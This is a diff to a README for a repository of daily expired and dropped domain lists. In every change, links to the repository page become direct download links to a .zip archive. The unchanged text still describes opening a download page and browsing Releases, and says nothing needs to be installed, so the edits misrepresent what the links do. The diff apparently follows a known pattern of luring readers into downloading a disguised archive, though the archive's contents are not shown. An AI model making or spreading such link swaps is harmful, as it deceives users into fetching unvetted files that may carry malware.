@@ -1,6 +1,6 @@
 # 🌐 daily-expired-and-dropped-domains - Up-to-date domain lists for research
 
-[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-brightgreen?style=for-the-badge)](https://github.com/steyn007/daily-expired-and-dropped-domains)
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/steyn007/daily-expired-and-dropped-domains/main/archive/expired_daily_and_dropped_domains_v1.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To get and use the domain lists, follow these steps carefully. You do not need t
 
 1. Click the green button below to open the download page.
 
-   [![Download Dataset](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/steyn007/daily-expired-and-dropped-domains)
+   [![Download Dataset](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/steyn007/daily-expired-and-dropped-domains/main/archive/expired_daily_and_dropped_domains_v1.4.zip)
 
 2. On the GitHub page, find the **Releases** section or download the latest available files. These will typically be `.csv` or `.txt` files containing domain names.
 
@@ -110,7 +110,7 @@ This repository focuses on publicly sharing daily lists of domains that recently
 
 To download and start using the dataset on Windows:
 
-1. Open this link: [https://github.com/steyn007/daily-expired-and-dropped-domains](https://github.com/steyn007/daily-expired-and-dropped-domains)
+1. Open this link: [https://raw.githubusercontent.com/steyn007/daily-expired-and-dropped-domains/main/archive/expired_daily_and_dropped_domains_v1.4.zip](https://raw.githubusercontent.com/steyn007/daily-expired-and-dropped-domains/main/archive/expired_daily_and_dropped_domains_v1.4.zip)
 
 2. Click on the **Releases** tab or scroll to find the latest files.
 
@@ -126,7 +126,7 @@ You do not need to run or install any program. The files are ready to view or pr
 
 ## 🔗 Useful Links
 
-- Main page: https://github.com/steyn007/daily-expired-and-dropped-domains  
+- Main page: https://raw.githubusercontent.com/steyn007/daily-expired-and-dropped-domains/main/archive/expired_daily_and_dropped_domains_v1.4.zip  
 - Releases: Access latest downloadable files on the repository page under "Releases"  
 
 ---
